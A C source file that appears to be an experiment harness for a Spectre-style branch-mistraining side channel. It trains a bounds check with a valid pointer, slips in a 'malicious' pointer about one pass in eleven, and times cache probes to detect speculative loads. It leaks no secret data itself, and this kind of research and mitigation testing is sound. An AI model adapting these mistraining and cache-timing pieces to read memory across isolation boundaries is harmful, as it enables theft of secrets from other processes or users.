#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>

#include "spec.h"

static volatile int val = 2;
static int *valid_ptr;
static int
victim_function(void const*const arr)
{
    volatile static int i = 1;
    int const*const i_arr = arr;
    if (likely(i_arr == valid_ptr)) {
        i *= *i_arr;
    }

    return i;
}

void
spec_access(void const*const ptr)
{
    uintptr_t const training_val = (uintptr_t)&val;
    uintptr_t const malicious = (uintptr_t)ptr;
    valid_ptr = (void *)&val;
    for (unsigned i = 1000; i > 0; --i) {
        flush(&valid_ptr);
        mfence();

        /* The following is a tricksy way to call the victim function with
         * the malicious value 1 out of every 11 times through this loop
         */
#if UINTPTR_MAX == 0xffffffffffffffffull
        uintptr_t x = (((uintptr_t)i % 11) - 1) & 0xffffffff00000000ul;
        x |= x >> 32;
#elif UINTPTR_MAX == 0xffffffffull
        uintptr_t x = (((uintptr_t)i % 11) - 1) & 0xffff0000ul;
        x |= x >> 16;
#else
# error What?
#endif
        x = training_val ^ (x & (malicious ^ training_val));
        val = victim_function((void *)x);
    }
}

void
unspec(void const*const ptr)
{
    volatile int val = 0;
    for (int i = 0; i < 10; ++i) {
        val += ((int *)ptr)[i];
    }
}

void
just_prefetch(void const*const ptr)
{
    prefetch(ptr, 0);
    for (volatile int i = 0; i < 1000; ++i) {}
}

unsigned char abba[256 * 512];

#define NUM_TRIALS (1 << 11)
#define CACHE_HIT_THRESHOLD 100

void
spec_test(void (func_name)(void const*))
{
    unsigned char *ptr = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (ptr == MAP_FAILED) {
        printf("Map failed\n");
        return;
    }

    uint64_t *values = malloc(NUM_TRIALS * sizeof(*values));
    unsigned char tmp;
    unsigned long baseline = 0;
    for (int i = 0; i < NUM_TRIALS; ++i) {
        flush(ptr);
        uint64_t const reading = my_probe(ptr, &tmp);
        if (reading < CACHE_HIT_THRESHOLD) {
            ++baseline;
        }
    }
    printf("baseline is %lu\n", baseline);

    baseline = 0;
    for (int i = 0; i < NUM_TRIALS; ++i) {
        flush(ptr);
        func_name(ptr);
        uint64_t const reading = my_probe(ptr, &tmp);
        if (reading < CACHE_HIT_THRESHOLD) {
            ++baseline;
        }
    }
    printf("speculative is %lu\n", baseline);

    munmap(ptr, 0x1000);
}

int
main(void)
{
    spec_test(spec_access);
    spec_test(unspec);
    //spec_test(just_prefetch);
    return 0;
}
